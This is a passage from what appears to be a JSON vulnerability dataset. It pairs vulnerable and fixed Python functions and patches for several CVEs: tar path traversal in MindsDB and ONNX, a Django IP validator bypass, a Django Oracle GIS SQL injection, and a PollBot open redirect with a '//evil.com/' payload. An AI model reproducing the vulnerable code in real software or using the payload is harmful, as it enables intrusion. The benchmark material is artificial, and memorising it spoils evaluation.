        "snippet": "    def put(self, name: str):\n        ''' add new file\n            params in FormData:\n                - file\n                - original_file_name [optional]\n        '''\n\n        data = {}\n        mindsdb_file_name = name\n\n        existing_file_names = ca.file_controller.get_files_names()\n\n        def on_field(field):\n            name = field.field_name.decode()\n            value = field.value.decode()\n            data[name] = value\n\n        file_object = None\n\n        def on_file(file):\n            nonlocal file_object\n            data['file'] = file.file_name.decode()\n            file_object = file.file_object\n\n        temp_dir_path = tempfile.mkdtemp(prefix='mindsdb_file_')\n\n        if request.headers['Content-Type'].startswith('multipart/form-data'):\n            parser = multipart.create_form_parser(\n                headers=request.headers,\n                on_field=on_field,\n                on_file=on_file,\n                config={\n                    'UPLOAD_DIR': temp_dir_path.encode(),    # bytes required\n                    'UPLOAD_KEEP_FILENAME': True,\n                    'UPLOAD_KEEP_EXTENSIONS': True,\n                    'MAX_MEMORY_FILE_SIZE': 0\n                }\n            )\n\n            while True:\n                chunk = request.stream.read(8192)\n                if not chunk:\n                    break\n                parser.write(chunk)\n            parser.finalize()\n            parser.close()\n\n            if file_object is not None and not file_object.closed:\n                file_object.close()\n        else:\n            data = request.json\n\n        if mindsdb_file_name in existing_file_names:\n            return http_error(\n                400,\n                \"File already exists\",\n                f\"File with name '{data['file']}' already exists\"\n            )\n\n        if data.get('source_type') == 'url':\n            url = data['source']\n            data['file'] = data['name']\n\n            config = Config()\n            is_cloud = config.get('cloud', False)\n            if is_cloud is True and ctx.user_class != 1:\n                info = requests.head(url)\n                file_size = info.headers.get('Content-Length')\n                try:\n                    file_size = int(file_size)\n                except Exception:\n                    pass\n\n                if file_size is None:\n                    return http_error(\n                        400,\n                        \"Error getting file info\",\n                        \"\\u0421an't determine remote file size\"\n                    )\n                if file_size > 1024 * 1024 * 100:\n                    return http_error(\n                        400,\n                        \"File is too big\",\n                        \"Upload limit for file is 100Mb\"\n                    )\n            with requests.get(url, stream=True) as r:\n                if r.status_code != 200:\n                    return http_error(\n                        400,\n                        \"Error getting file\",\n                        f\"Got status code: {r.status_code}\"\n                    )\n                file_path = os.path.join(temp_dir_path, data['file'])\n                with open(file_path, 'wb') as f:\n                    for chunk in r.iter_content(chunk_size=8192):\n                        f.write(chunk)\n\n        original_file_name = data.get('original_file_name')\n\n        file_path = os.path.join(temp_dir_path, data['file'])\n        lp = file_path.lower()\n        if lp.endswith(('.zip', '.tar.gz')):\n            if lp.endswith('.zip'):\n                with zipfile.ZipFile(file_path) as f:\n                    f.extractall(temp_dir_path)\n            elif lp.endswith('.tar.gz'):\n                with tarfile.open(file_path) as f:\n                    f.extractall(temp_dir_path)\n            os.remove(file_path)\n            files = os.listdir(temp_dir_path)\n            if len(files) != 1:\n                os.rmdir(temp_dir_path)\n                return http_error(400, 'Wrong content.', 'Archive must contain only one data file.')\n            file_path = os.path.join(temp_dir_path, files[0])\n            mindsdb_file_name = files[0]\n            if not os.path.isfile(file_path):\n                os.rmdir(temp_dir_path)\n                return http_error(400, 'Wrong content.', 'Archive must contain data file in root.')\n\n        ca.file_controller.save_file(mindsdb_file_name, file_path, file_name=original_file_name)\n\n        os.rmdir(temp_dir_path)\n\n        return '', 200"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_180_1",
        "commit": "4419b0f",
        "file_path": "mindsdb/api/http/namespaces/file.py",
        "start_line": 30,
        "end_line": 153,
        "snippet": "    def put(self, name: str):\n        ''' add new file\n            params in FormData:\n                - file\n                - original_file_name [optional]\n        '''\n\n        data = {}\n        mindsdb_file_name = name\n\n        existing_file_names = ca.file_controller.get_files_names()\n\n        def on_field(field):\n            name = field.field_name.decode()\n            value = field.value.decode()\n            data[name] = value\n\n        file_object = None\n\n        def on_file(file):\n            nonlocal file_object\n            data['file'] = file.file_name.decode()\n            file_object = file.file_object\n\n        temp_dir_path = tempfile.mkdtemp(prefix='mindsdb_file_')\n\n        if request.headers['Content-Type'].startswith('multipart/form-data'):\n            parser = multipart.create_form_parser(\n                headers=request.headers,\n                on_field=on_field,\n                on_file=on_file,\n                config={\n                    'UPLOAD_DIR': temp_dir_path.encode(),    # bytes required\n                    'UPLOAD_KEEP_FILENAME': True,\n                    'UPLOAD_KEEP_EXTENSIONS': True,\n                    'MAX_MEMORY_FILE_SIZE': 0\n                }\n            )\n\n            while True:\n                chunk = request.stream.read(8192)\n                if not chunk:\n                    break\n                parser.write(chunk)\n            parser.finalize()\n            parser.close()\n\n            if file_object is not None and not file_object.closed:\n                file_object.close()\n        else:\n            data = request.json\n\n        if mindsdb_file_name in existing_file_names:\n            return http_error(\n                400,\n                \"File already exists\",\n                f\"File with name '{data['file']}' already exists\"\n            )\n\n        if data.get('source_type') == 'url':\n            url = data['source']\n            data['file'] = data['name']\n\n            config = Config()\n            is_cloud = config.get('cloud', False)\n            if is_cloud is True and ctx.user_class != 1:\n                info = requests.head(url)\n                file_size = info.headers.get('Content-Length')\n                try:\n                    file_size = int(file_size)\n                except Exception:\n                    pass\n\n                if file_size is None:\n                    return http_error(\n                        400,\n                        \"Error getting file info\",\n                        \"\\u0421an't determine remote file size\"\n                    )\n                if file_size > 1024 * 1024 * 100:\n                    return http_error(\n                        400,\n                        \"File is too big\",\n                        \"Upload limit for file is 100Mb\"\n                    )\n            with requests.get(url, stream=True) as r:\n                if r.status_code != 200:\n                    return http_error(\n                        400,\n                        \"Error getting file\",\n                        f\"Got status code: {r.status_code}\"\n                    )\n                file_path = os.path.join(temp_dir_path, data['file'])\n                with open(file_path, 'wb') as f:\n                    for chunk in r.iter_content(chunk_size=8192):\n                        f.write(chunk)\n\n        original_file_name = data.get('original_file_name')\n\n        file_path = os.path.join(temp_dir_path, data['file'])\n        lp = file_path.lower()\n        if lp.endswith(('.zip', '.tar.gz')):\n            if lp.endswith('.zip'):\n                with zipfile.ZipFile(file_path) as f:\n                    f.extractall(temp_dir_path)\n            elif lp.endswith('.tar.gz'):\n                with tarfile.open(file_path) as f:\n                    safe_extract(f, temp_dir_path)\n            os.remove(file_path)\n            files = os.listdir(temp_dir_path)\n            if len(files) != 1:\n                os.rmdir(temp_dir_path)\n                return http_error(400, 'Wrong content.', 'Archive must contain only one data file.')\n            file_path = os.path.join(temp_dir_path, files[0])\n            mindsdb_file_name = files[0]\n            if not os.path.isfile(file_path):\n                os.rmdir(temp_dir_path)\n                return http_error(400, 'Wrong content.', 'Archive must contain data file in root.')\n\n        ca.file_controller.save_file(mindsdb_file_name, file_path, file_name=original_file_name)\n\n        os.rmdir(temp_dir_path)\n\n        return '', 200"
      },
      {
        "id": "fix_py_180_2",
        "commit": "4419b0f",
        "file_path": "mindsdb/api/http/utils.py",
        "start_line": 27,
        "end_line": 31,
        "snippet": "def __is_within_directory(directory, target):\n    abs_directory = os.path.abspath(directory)\n    abs_target = os.path.abspath(target)\n    prefix = os.path.commonprefix([abs_directory, abs_target])\n    return prefix == abs_directory"
      },
      {
        "id": "fix_py_180_3",
        "commit": "4419b0f",
        "file_path": "mindsdb/api/http/utils.py",
        "start_line": 33,
        "end_line": 38,
        "snippet": "def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n    for member in tar.getmembers():\n        member_path = os.path.join(path, member.name)\n        if not __is_within_directory(path, member_path):\n            raise Exception(\"Attempted Path Traversal in Tar File\")\n    tar.extractall(path, members, numeric_owner) "
      }
    ],
    "vul_patch": "--- a/mindsdb/api/http/namespaces/file.py\n+++ b/mindsdb/api/http/namespaces/file.py\n@@ -105,7 +105,7 @@\n                     f.extractall(temp_dir_path)\n             elif lp.endswith('.tar.gz'):\n                 with tarfile.open(file_path) as f:\n-                    f.extractall(temp_dir_path)\n+                    safe_extract(f, temp_dir_path)\n             os.remove(file_path)\n             files = os.listdir(temp_dir_path)\n             if len(files) != 1:\n\n--- /dev/null\n+++ b/mindsdb/api/http/namespaces/file.py\n@@ -0,0 +1,5 @@\n+def __is_within_directory(directory, target):\n+    abs_directory = os.path.abspath(directory)\n+    abs_target = os.path.abspath(target)\n+    prefix = os.path.commonprefix([abs_directory, abs_target])\n+    return prefix == abs_directory\n\n--- /dev/null\n+++ b/mindsdb/api/http/namespaces/file.py\n@@ -0,0 +1,6 @@\n+def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n+    for member in tar.getmembers():\n+        member_path = os.path.join(path, member.name)\n+        if not __is_within_directory(path, member_path):\n+            raise Exception(\"Attempted Path Traversal in Tar File\")\n+    tar.extractall(path, members, numeric_owner) \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-33571",
    "cve_description": "In Django 2.2 before 2.2.24, 3.x before 3.1.12, and 3.2 before 3.2.4, URLValidator, validate_ipv4_address, and validate_ipv46_address do not prohibit leading zero characters in octal literals. This may allow a bypass of access control that is based on IP addresses. (validate_ipv4_address and validate_ipv46_address are unaffected with Python 3.9.5+..) .",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/f27c38ab5d90f68c9dd60cabef248a570c0be8fc",
      "https://github.com/django/django/commit/203d4ab9ebcd72fc4d6eb7398e66ed9e474e118e",
      "https://github.com/django/django/commit/9f75e2e562fa0c0482f3dde6fc7399a9070b4a3d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_215_1",
        "commit": "053cc95",
        "file_path": "django/core/validators.py",
        "start_line": 77,
        "end_line": 78,
        "snippet": "    # IP patterns\n    ipv4_re = r'(?:25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}'"
      },
      {
        "id": "vul_py_215_2",
        "commit": "053cc95",
        "file_path": "django/core/validators.py",
        "start_line": 254,
        "end_line": 258,
        "snippet": "def validate_ipv4_address(value):\n    try:\n        ipaddress.IPv4Address(value)\n    except ValueError:\n        raise ValidationError(_('Enter a valid IPv4 address.'), code='invalid')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_215_1",
        "commit": "f27c38a",
        "file_path": "django/core/validators.py",
        "start_line": 77,
        "end_line": 78,
        "snippet": "    # IP patterns\n    ipv4_re = r'(?:0|25[0-5]|2[0-4]\\d|1\\d?\\d?|[1-9]\\d?)(?:\\.(?:0|25[0-5]|2[0-4]\\d|1\\d?\\d?|[1-9]\\d?)){3}'"
      },
      {
        "id": "fix_py_215_2",
        "commit": "f27c38a",
        "file_path": "django/core/validators.py",
        "start_line": 254,
        "end_line": 270,
        "snippet": "def validate_ipv4_address(value):\n    try:\n        ipaddress.IPv4Address(value)\n    except ValueError:\n        raise ValidationError(_('Enter a valid IPv4 address.'), code='invalid')\n    else:\n        # Leading zeros are forbidden to avoid ambiguity with the octal\n        # notation. This restriction is included in Python 3.9.5+.\n        # TODO: Remove when dropping support for PY39.\n        if any(\n            octet != '0' and octet[0] == '0'\n            for octet in value.split('.')\n        ):\n            raise ValidationError(\n                _('Enter a valid IPv4 address.'),\n                code='invalid',\n            )"
      }
    ],
    "vul_patch": "--- a/django/core/validators.py\n+++ b/django/core/validators.py\n@@ -1,2 +1,2 @@\n     # IP patterns\n-    ipv4_re = r'(?:25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}'\n+    ipv4_re = r'(?:0|25[0-5]|2[0-4]\\d|1\\d?\\d?|[1-9]\\d?)(?:\\.(?:0|25[0-5]|2[0-4]\\d|1\\d?\\d?|[1-9]\\d?)){3}'\n\n--- a/django/core/validators.py\n+++ b/django/core/validators.py\n@@ -3,3 +3,15 @@\n         ipaddress.IPv4Address(value)\n     except ValueError:\n         raise ValidationError(_('Enter a valid IPv4 address.'), code='invalid')\n+    else:\n+        # Leading zeros are forbidden to avoid ambiguity with the octal\n+        # notation. This restriction is included in Python 3.9.5+.\n+        # TODO: Remove when dropping support for PY39.\n+        if any(\n+            octet != '0' and octet[0] == '0'\n+            for octet in value.split('.')\n+        ):\n+            raise ValidationError(\n+                _('Enter a valid IPv4 address.'),\n+                code='invalid',\n+            )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-5187",
    "cve_description": "A vulnerability in the `download_model_with_test_data` function of the onnx/onnx framework, version 1.16.0, allows for arbitrary file overwrite due to inadequate prevention of path traversal attacks in malicious tar files. This vulnerability enables attackers to overwrite any file on the system, potentially leading to remote code execution, deletion of system, personal, or application files, thus impacting the integrity and availability of the system. The issue arises from the function's handling of tar file extraction without performing security checks on the paths within the tar file, as demonstrated by the ability to overwrite the `/home/kali/.ssh/authorized_keys` file by specifying an absolute path in the malicious tar file.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/onnx/onnx",
    "patch_url": [
      "https://github.com/onnx/onnx/commit/3fc3845edb048df559aa2a839e39e95503a0ee34",
      "https://github.com/onnx/onnx/commit/1b70f9b673259360b6a2339c4bd97db9ea6e552f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_320_1",
        "commit": "06d4691",
        "file_path": "onnx/hub.py",
        "start_line": "293",
        "end_line": "378",
        "snippet": "def download_model_with_test_data(\n    model: str,\n    repo: str = \"onnx/models:main\",\n    opset: int | None = None,\n    force_reload: bool = False,\n    silent: bool = False,\n) -> str | None:\n    \"\"\"Downloads a model along with test data by name from the onnx model hub and returns the directory to which the files have been extracted.\n\n    Args:\n        model: The name of the onnx model in the manifest. This field is\n            case-sensitive\n        repo: The location of the model repo in format\n            \"user/repo[:branch]\". If no branch is found will default to\n            \"main\"\n        opset: The opset of the model to download. The default of `None`\n            automatically chooses the largest opset\n        force_reload: Whether to force the model to re-download even if\n            its already found in the cache\n        silent: Whether to suppress the warning message if the repo is\n            not trusted.\n\n    Returns:\n        str or None\n    \"\"\"\n    selected_model = get_model_info(model, repo, opset)\n\n    local_model_with_data_path_arr = selected_model.metadata[\n        \"model_with_data_path\"\n    ].split(\"/\")\n\n    model_with_data_sha = selected_model.metadata[\"model_with_data_sha\"]\n\n    if model_with_data_sha is not None:\n        local_model_with_data_path_arr[-1] = (\n            f\"{model_with_data_sha}_{local_model_with_data_path_arr[-1]}\"\n        )\n    local_model_with_data_path = join(\n        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)\n    )\n\n    if force_reload or not os.path.exists(local_model_with_data_path):\n        if not _verify_repo_ref(repo) and not silent:\n            msg = f\"The model repo specification {repo} is not trusted and may contain security vulnerabilities. Only continue if you trust this repo.\"\n\n            print(msg, file=sys.stderr)\n            print(\"Continue?[y/n]\")\n            if input().lower() != \"y\":\n                return None\n\n        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)\n        lfs_url = _get_base_url(repo, True)\n        print(f\"Downloading {model} to local path {local_model_with_data_path}\")\n        _download_file(\n            lfs_url + selected_model.metadata[\"model_with_data_path\"],\n            local_model_with_data_path,\n        )\n    else:\n        print(f\"Using cached {model} model from {local_model_with_data_path}\")\n\n    with open(local_model_with_data_path, \"rb\") as f:\n        model_with_data_bytes = f.read()\n\n    if model_with_data_sha is not None:\n        downloaded_sha = hashlib.sha256(model_with_data_bytes).hexdigest()\n        if not downloaded_sha == model_with_data_sha:\n            raise AssertionError(\n                f\"The cached model {selected_model.model} has SHA256 {downloaded_sha} \"\n                f\"while checksum should be {model_with_data_sha}. \"\n                \"The model in the hub may have been updated. Use force_reload to \"\n                \"download the model from the model hub.\"\n            )\n\n    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:\n        # FIXME: Avoid index manipulation with magic numbers\n        local_model_with_data_dir_path = local_model_with_data_path[\n            0 : len(local_model_with_data_path) - 7\n        ]\n        model_with_data_zipped.extractall(local_model_with_data_dir_path)\n    model_with_data_path = (\n        local_model_with_data_dir_path\n        + \"/\"\n        + os.listdir(local_model_with_data_dir_path)[0]\n    )\n\n    return model_with_data_path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_320_1",
        "commit": "3fc3845",
        "file_path": "onnx/hub.py",
        "start_line": "322",
        "end_line": "419",
        "snippet": "def download_model_with_test_data(\n    model: str,\n    repo: str = \"onnx/models:main\",\n    opset: int | None = None,\n    force_reload: bool = False,\n    silent: bool = False,\n) -> str | None:\n    \"\"\"Downloads a model along with test data by name from the onnx model hub and returns the directory to which the files have been extracted.\n    Users are responsible for making sure the model comes from a trusted source, and the data is safe to be extracted.\n\n    Args:\n        model: The name of the onnx model in the manifest. This field is\n            case-sensitive\n        repo: The location of the model repo in format\n            \"user/repo[:branch]\". If no branch is found will default to\n            \"main\"\n        opset: The opset of the model to download. The default of `None`\n            automatically chooses the largest opset\n        force_reload: Whether to force the model to re-download even if\n            its already found in the cache\n        silent: Whether to suppress the warning message if the repo is\n            not trusted.\n\n    Returns:\n        str or None\n    \"\"\"\n    selected_model = get_model_info(model, repo, opset)\n\n    local_model_with_data_path_arr = selected_model.metadata[\n        \"model_with_data_path\"\n    ].split(\"/\")\n\n    model_with_data_sha = selected_model.metadata[\"model_with_data_sha\"]\n\n    if model_with_data_sha is not None:\n        local_model_with_data_path_arr[-1] = (\n            f\"{model_with_data_sha}_{local_model_with_data_path_arr[-1]}\"\n        )\n    local_model_with_data_path = join(\n        _ONNX_HUB_DIR, os.sep.join(local_model_with_data_path_arr)\n    )\n\n    if force_reload or not os.path.exists(local_model_with_data_path):\n        if not _verify_repo_ref(repo) and not silent:\n            msg = f\"The model repo specification {repo} is not trusted and may contain security vulnerabilities. Only continue if you trust this repo.\"\n\n            print(msg, file=sys.stderr)\n            print(\"Continue?[y/n]\")\n            if input().lower() != \"y\":\n                return None\n\n        os.makedirs(os.path.dirname(local_model_with_data_path), exist_ok=True)\n        lfs_url = _get_base_url(repo, True)\n        print(f\"Downloading {model} to local path {local_model_with_data_path}\")\n        _download_file(\n            lfs_url + selected_model.metadata[\"model_with_data_path\"],\n            local_model_with_data_path,\n        )\n    else:\n        print(f\"Using cached {model} model from {local_model_with_data_path}\")\n\n    with open(local_model_with_data_path, \"rb\") as f:\n        model_with_data_bytes = f.read()\n\n    if model_with_data_sha is not None:\n        downloaded_sha = hashlib.sha256(model_with_data_bytes).hexdigest()\n        if not downloaded_sha == model_with_data_sha:\n            raise AssertionError(\n                f\"The cached model {selected_model.model} has SHA256 {downloaded_sha} \"\n                f\"while checksum should be {model_with_data_sha}. \"\n                \"The model in the hub may have been updated. Use force_reload to \"\n                \"download the model from the model hub.\"\n            )\n\n    with tarfile.open(local_model_with_data_path) as model_with_data_zipped:\n        # FIXME: Avoid index manipulation with magic numbers\n        local_model_with_data_dir_path = local_model_with_data_path[\n            0 : len(local_model_with_data_path) - 7\n        ]\n        # Mitigate tarball directory traversal risks\n        if hasattr(tarfile, \"data_filter\"):\n            model_with_data_zipped.extractall(\n                path=local_model_with_data_dir_path, filter=\"data\"\n            )\n        else:\n            model_with_data_zipped.extractall(\n                path=local_model_with_data_dir_path,\n                members=_tar_members_filter(\n                    model_with_data_zipped, local_model_with_data_dir_path\n                ),\n            )\n    model_with_data_path = (\n        local_model_with_data_dir_path\n        + \"/\"\n        + os.listdir(local_model_with_data_dir_path)[0]\n    )\n\n    return model_with_data_path"
      },
      {
        "id": "fix_py_320_2",
        "commit": "3fc3845",
        "file_path": "onnx/hub.py",
        "start_line": "293",
        "end_line": "319",
        "snippet": "def _tar_members_filter(tar: tarfile.TarFile, base: str) -> list[tarfile.TarInfo]:\n    \"\"\"Check that the content of ``tar`` will be extracted safely\n\n    Args:\n        tar: The tarball file\n        base: The directory where the tarball will be extracted\n\n    Returns:\n        list of tarball members\n    \"\"\"\n    result = []\n    for member in tar:\n        member_path = os.path.join(base, member.name)\n        abs_base = os.path.abspath(base)\n        abs_member = os.path.abspath(member_path)\n        if not abs_member.startswith(abs_base):\n            raise RuntimeError(\n                f\"The tarball member {member_path} in downloading model contains \"\n                f\"directory traversal sequence which may contain harmful payload.\"\n            )\n        elif member.issym() or member.islnk():\n            raise RuntimeError(\n                f\"The tarball member {member_path} in downloading model contains \"\n                f\"symbolic links which may contain harmful payload.\"\n            )\n        result.append(member)\n    return result"
      }
    ],
    "vul_patch": "--- a/onnx/hub.py\n+++ b/onnx/hub.py\n@@ -6,6 +6,7 @@\n     silent: bool = False,\n ) -> str | None:\n     \"\"\"Downloads a model along with test data by name from the onnx model hub and returns the directory to which the files have been extracted.\n+    Users are responsible for making sure the model comes from a trusted source, and the data is safe to be extracted.\n \n     Args:\n         model: The name of the onnx model in the manifest. This field is\n@@ -76,7 +77,18 @@\n         local_model_with_data_dir_path = local_model_with_data_path[\n             0 : len(local_model_with_data_path) - 7\n         ]\n-        model_with_data_zipped.extractall(local_model_with_data_dir_path)\n+        # Mitigate tarball directory traversal risks\n+        if hasattr(tarfile, \"data_filter\"):\n+            model_with_data_zipped.extractall(\n+                path=local_model_with_data_dir_path, filter=\"data\"\n+            )\n+        else:\n+            model_with_data_zipped.extractall(\n+                path=local_model_with_data_dir_path,\n+                members=_tar_members_filter(\n+                    model_with_data_zipped, local_model_with_data_dir_path\n+                ),\n+            )\n     model_with_data_path = (\n         local_model_with_data_dir_path\n         + \"/\"\n\n--- /dev/null\n+++ b/onnx/hub.py\n@@ -0,0 +1,27 @@\n+def _tar_members_filter(tar: tarfile.TarFile, base: str) -> list[tarfile.TarInfo]:\n+    \"\"\"Check that the content of ``tar`` will be extracted safely\n+\n+    Args:\n+        tar: The tarball file\n+        base: The directory where the tarball will be extracted\n+\n+    Returns:\n+        list of tarball members\n+    \"\"\"\n+    result = []\n+    for member in tar:\n+        member_path = os.path.join(base, member.name)\n+        abs_base = os.path.abspath(base)\n+        abs_member = os.path.abspath(member_path)\n+        if not abs_member.startswith(abs_base):\n+            raise RuntimeError(\n+                f\"The tarball member {member_path} in downloading model contains \"\n+                f\"directory traversal sequence which may contain harmful payload.\"\n+            )\n+        elif member.issym() or member.islnk():\n+            raise RuntimeError(\n+                f\"The tarball member {member_path} in downloading model contains \"\n+                f\"symbolic links which may contain harmful payload.\"\n+            )\n+        result.append(member)\n+    return result\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-9402",
    "cve_description": "Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_296_1",
        "commit": "65ab4f9",
        "file_path": "django/contrib/gis/db/models/aggregates.py",
        "start_line": 29,
        "end_line": 32,
        "snippet": "    def as_oracle(self, compiler, connection, **extra_context):\n        tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)\n        template = None if self.is_extent else '%(function)s(SDOAGGRTYPE(%(expressions)s,%(tolerance)s))'\n        return self.as_sql(compiler, connection, template=template, tolerance=tolerance, **extra_context)"
      },
      {
        "id": "vul_py_296_2",
        "commit": "65ab4f9",
        "file_path": "django/contrib/gis/db/models/functions.py",
        "start_line": 113,
        "end_line": 119,
        "snippet": "    def as_oracle(self, compiler, connection, **extra_context):\n        tol = self.extra.get('tolerance', self.tolerance)\n        return self.as_sql(\n            compiler, connection,\n            template=\"%%(function)s(%%(expressions)s, %s)\" % tol,\n            **extra_context\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_296_1",
        "commit": "6695d29b1c1ce979725816295a26ecc64ae0e927",
        "file_path": "django/contrib/gis/db/models/aggregates.py",
        "start_line": 29,
        "end_line": 39,
        "snippet": "    def as_oracle(self, compiler, connection, **extra_context):\n        if not self.is_extent:\n            tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)\n            clone = self.copy()\n            clone.set_source_expressions([\n                *self.get_source_expressions(),\n                Value(tolerance),\n            ])\n            template = '%(function)s(SDOAGGRTYPE(%(expressions)s))'\n            return clone.as_sql(compiler, connection, template=template, **extra_context)\n        return self.as_sql(compiler, connection, **extra_context)"
      },
      {
        "id": "fix_py_296_2",
        "commit": "6695d29b1c1ce979725816295a26ecc64ae0e927",
        "file_path": "django/contrib/gis/db/models/functions.py",
        "start_line": 113,
        "end_line": 121,
        "snippet": "    def as_oracle(self, compiler, connection, **extra_context):\n        tolerance = Value(self._handle_param(\n            self.extra.get('tolerance', self.tolerance),\n            'tolerance',\n            NUMERIC_TYPES,\n        ))\n        clone = self.copy()\n        clone.set_source_expressions([*self.get_source_expressions(), tolerance])\n        return clone.as_sql(compiler, connection, **extra_context)"
      }
    ],
    "vul_patch": "--- a/django/contrib/gis/db/models/aggregates.py\n+++ b/django/contrib/gis/db/models/aggregates.py\n@@ -1,4 +1,11 @@\n     def as_oracle(self, compiler, connection, **extra_context):\n-        tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)\n-        template = None if self.is_extent else '%(function)s(SDOAGGRTYPE(%(expressions)s,%(tolerance)s))'\n-        return self.as_sql(compiler, connection, template=template, tolerance=tolerance, **extra_context)\n+        if not self.is_extent:\n+            tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)\n+            clone = self.copy()\n+            clone.set_source_expressions([\n+                *self.get_source_expressions(),\n+                Value(tolerance),\n+            ])\n+            template = '%(function)s(SDOAGGRTYPE(%(expressions)s))'\n+            return clone.as_sql(compiler, connection, template=template, **extra_context)\n+        return self.as_sql(compiler, connection, **extra_context)\n\n--- a/django/contrib/gis/db/models/functions.py\n+++ b/django/contrib/gis/db/models/functions.py\n@@ -1,7 +1,9 @@\n     def as_oracle(self, compiler, connection, **extra_context):\n-        tol = self.extra.get('tolerance', self.tolerance)\n-        return self.as_sql(\n-            compiler, connection,\n-            template=\"%%(function)s(%%(expressions)s, %s)\" % tol,\n-            **extra_context\n-        )\n+        tolerance = Value(self._handle_param(\n+            self.extra.get('tolerance', self.tolerance),\n+            'tolerance',\n+            NUMERIC_TYPES,\n+        ))\n+        clone = self.copy()\n+        clone.set_source_expressions([*self.get_source_expressions(), tolerance])\n+        return clone.as_sql(compiler, connection, **extra_context)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21354",
    "cve_description": "Pollbot is open source software which \"frees its human masters from the toilsome task of polling for the state of things during the Firefox release process.\" In Pollbot before version 1.4.4 there is an open redirection vulnerability in the path of \"https://pollbot.services.mozilla.com/\". An attacker can redirect anyone to malicious sites. To Reproduce type in this URL: \"https://pollbot.services.mozilla.com//evil.com/\". Affected versions will redirect to that website when you inject a payload like \"//evil.com/\". This is fixed in version 1.4.4.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/mozilla/PollBot",
    "patch_url": [
      "https://github.com/mozilla/PollBot/commit/6db74a4fcbff258c7cdf51a6ff0724fc10c485e5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_33_1",
        "commit": "78539af",
        "file_path": "pollbot/middlewares.py",
        "start_line": 61,
        "end_line": 69,
        "snippet": "async def handle_404(request, response):\n    if 'json' not in response.headers['Content-Type']:\n        if request.path.endswith('/'):\n            return web.HTTPFound(request.path.rstrip('/'))\n        return web.json_response({\n            \"status\": 404,\n            \"message\": \"Page '{}' not found\".format(request.path)\n        }, status=404)\n    return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_33_1",
        "commit": "6db74a4fcbff258c7cdf51a6ff0724fc10c485e5",
        "file_path": "pollbot/middlewares.py",
        "start_line": 61,
        "end_line": 69,
        "snippet": "async def handle_404(request, response):\n    if 'json' not in response.headers['Content-Type']:\n        if request.path.endswith('/'):\n            return web.HTTPFound('/' + request.path.strip('/'))\n        return web.json_response({\n            \"status\": 404,\n            \"message\": \"Page '{}' not found\".format(request.path)\n        }, status=404)\n    return response"
      }
    ],
    "vul_patch": "--- a/pollbot/middlewares.py\n+++ b/pollbot/middlewares.py\n@@ -1,7 +1,7 @@\n async def handle_404(request, response):\n     if 'json' not in response.headers['Content-Type']:\n         if request.path.endswith('/'):\n-            return web.HTTPFound(request.path.rstrip('/'))\n+            return web.HTTPFound('/' + request.path.strip('/'))\n         return web.json_response({\n             \"status\": 404,\n             \"message\": \"Page '{}' not found\".format(request.path)\n\n",
